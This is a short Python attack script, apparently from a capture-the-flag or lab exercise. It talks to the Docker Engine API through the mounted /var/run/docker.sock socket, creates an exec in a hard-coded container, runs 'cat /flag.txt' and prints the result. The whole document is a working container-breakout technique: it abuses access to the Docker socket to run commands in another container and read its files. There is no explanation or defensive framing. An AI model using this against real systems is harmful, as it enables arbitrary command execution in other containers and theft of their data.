import socket, json, sys

SOCK = '/var/run/docker.sock'
CONTAINER = 'b0b22fe23519'

def send(path, method='GET', body=None):
    s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
    s.connect(SOCK)
    if body:
        b = json.dumps(body).encode()
        req = f'{method} {path} HTTP/1.1\r\nHost: localhost\r\nContent-Type: application/json\r\nContent-Length: {len(b)}\r\nConnection: close\r\n\r\n'.encode() + b
    else:
        req = f'{method} {path} HTTP/1.1\r\nHost: localhost\r\nConnection: close\r\n\r\n'.encode()
    s.sendall(req)
    resp = b''
    while True:
        d = s.recv(65536)
        if not d: break
        resp += d
    s.close()
    header, _, body = resp.partition(b'\r\n\r\n')
    return body

r = send(f'/containers/{CONTAINER}/exec', 'POST', {'AttachStdout':True,'AttachStderr':True,'Cmd':['cat','/flag.txt']})
print('CREATE:', r[:200])
eid = json.loads(r)['Id']
r2 = send(f'/exec/{eid}/start', 'POST', {'Detach':False,'Tty':False})
print('OUTPUT:', r2)
